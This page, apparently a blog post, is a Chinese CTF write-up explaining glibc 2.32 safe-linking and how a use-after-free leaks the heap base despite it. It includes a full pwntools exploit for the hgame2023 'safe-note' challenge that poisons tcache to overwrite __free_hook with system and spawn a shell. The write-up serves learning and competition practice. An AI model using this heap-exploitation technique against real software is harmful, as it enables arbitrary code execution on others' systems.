@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="hgame碰到的，之前写源码分析的时候就注意到了但没细看，结果立马就碰见了（挺玄学）。那就来仔细分析下这个东西(ง •_•)ง">
+<meta property="og:type" content="article">
+<meta property="og:title" content="safe-linking">
+<meta property="og:url" content="http://akaieurus.github.io/2023/01/25/safe-linking/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="hgame碰到的，之前写源码分析的时候就注意到了但没细看，结果立马就碰见了（挺玄学）。那就来仔细分析下这个东西(ง •_•)ง">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://akaieurus.github.io/2023/01/25/safe-linking/heapbase.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%89%8D.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%90%8E.png">
+<meta property="article:published_time" content="2023-01-25T05:00:14.000Z">
+<meta property="article:modified_time" content="2023-01-29T07:15:38.074Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="how2heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://akaieurus.github.io/2023/01/25/safe-linking/heapbase.png">
+
+<link rel="canonical" href="http://akaieurus.github.io/2023/01/25/safe-linking/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>safe-linking | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/01/25/safe-linking/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          safe-linking
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-01-25 13:00:14" itemprop="dateCreated datePublished" datetime="2023-01-25T13:00:14+08:00">2023-01-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-01-29 15:15:38" itemprop="dateModified" datetime="2023-01-29T15:15:38+08:00">2023-01-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>hgame碰到的，之前写源码分析的时候就注意到了但没细看，结果立马就碰见了（挺玄学）。那就来仔细分析下这个东西(ง •_•)ง</p>
+<span id="more"></span>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>2.32增加了单链表的保护机制，对fastbin和tcache的fd指针进行了运算，相关源码如下：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#define</span> <span class="built_in">PROTECT_PTR</span>(pos, ptr) \</span><br><span class="line">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; <span class="number">12</span>) ^ ((size_t) ptr)))</span><br><span class="line"><span class="selector-id">#define</span> <span class="built_in">REVEAL_PTR</span>(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></pre></td></tr></table></figure>
+<p>变化就是fd成员的内容从下一个chunk的地址ptr变成ptr^(&amp;ptr&gt;&gt;12)（亦或移位操作后的所存地址）</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="title">e</span>-&gt;</span><span class="function"><span class="title">next</span> = PROTECT_PTR (&amp;e-&gt;</span><span class="function"><span class="title">next</span>, tcache-&gt;</span>entries[tc_idx]);</span><br><span class="line"><span class="comment">//e-&gt;next = tcache-&gt;entries[tc_idx];（2.31源码）</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">tcache</span>-&gt;</span><span class="function"><span class="title">entries</span>[tc_idx] = REVEAL_PTR (e-&gt;</span>next);</span><br></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>在有uaf的情况下我们可以泄露出e-&gt;next，但最初tcache链表是空的，及tcache-&gt;entries[tc_idx] &#x3D; 0，设e为放入tcache的tcache_entry，那e-&gt;next &#x3D; (&amp;e-&gt;next&gt;&gt;12)^0 &#x3D; &amp;e-&gt;next&gt;&gt;12<br>已知chunk地址和heap基址的偏移我们可以通过泄露出来的值确定heap的基址，这意味着&amp;e-&gt;next的值之后都是已知的</p>
+<h3 id="例题hgame2023-week3-safe-note"><a href="#例题hgame2023-week3-safe-note" class="headerlink" title="例题hgame2023 week3 safe-note"></a>例题hgame2023 week3 safe-note</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>还是uaf（一个uaf出了两星期也是醉了，我看这个文件都快看吐了）  </p>
+<ul>
+<li>先按上文所说泄露heap基址（fd&lt;&lt;12就是heap基址）<img src="/2023/01/25/safe-linking/heapbase.png" class title="heap基址"></li>
+<li>然后老套路unsorted bin泄露libc基址    </li>
+<li>再申请然后释放两个另外大小的chunk（tcache有chunk数量的检测），更改chunk1的fd为<code>(&amp;chunk1-&gt;fd&gt;&gt;12)^&amp;__free_hook</code><img src="/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%89%8D.png" class title="更改前">
+<img src="/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%90%8E.png" class title="更改后"></li>
+<li>然后就是老套路了</li>
+</ul>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(index,size):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Size: &#x27;</span>,str(size).encode())</span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">def <span class="built_in">edit</span>(index,content):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;&gt;&#x27;</span>,b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&#x27;Index: &#x27;</span>,str(index).encode())</span><br><span class="line">def pack(pos, ptr):</span><br><span class="line">    return (pos &gt;&gt; 12) ^ ptr</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>=process(&#x27;./safe&#x27;)</span><br><span class="line"><span class="comment">#p=remote(&#x27;week-3.hgame.lwsec.cn&#x27;,32629)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="attribute">libc</span>=ELF(&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(0,0x10)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">s=(p.recvuntil(b<span class="string">&#x27;\n&#x27;</span>)[:-1]).ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="attribute">heap</span>=u64(s)&lt;&lt;12</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2,11):</span><br><span class="line">    <span class="built_in">add</span>(i,0xf0)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2,10):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="built_in">edit</span>(9,b<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(9)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">s=(b<span class="string">&#x27;\n&#x27;</span>+p.recvuntil(b<span class="string">&#x27;\n&#x27;</span>)[:-1]).ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="attribute">libcbase</span>=u64(s)-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-0xc0a+0xb90</span><br><span class="line"><span class="built_in">print</span>(hex(libcbase))</span><br><span class="line"><span class="built_in">print</span>(hex(heap))</span><br><span class="line"><span class="attribute">system_addr</span>=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="attribute">free_hook</span>=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">edit</span>(9,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(11, 0x20)</span><br><span class="line"><span class="built_in">add</span>(12, 0x20)</span><br><span class="line">delete(12)</span><br><span class="line">delete(11)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">edit</span>(11, p64(pack(heap + 0x290+0x9b0+0x10, free_hook)))</span><br><span class="line"><span class="built_in">add</span>(13, 0x20)</span><br><span class="line"><span class="built_in">edit</span>(13,b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(14, 0x20)</span><br><span class="line"><span class="built_in">edit</span>(14,p64(system_addr))</span><br><span class="line">delete(13)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/how2heap/" rel="tag"># how2heap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/23/fastbin-dup/" rel="prev" title="fastbin dup">
+      <i class="fa fa-chevron-left"></i> fastbin dup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/25/large-bin-attack/" rel="next" title="large bin attack">
+      large bin attack <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98hgame2023-week3-safe-note"><span class="nav-number">3.</span> <span class="nav-text">例题hgame2023 week3 safe-note</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">3.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
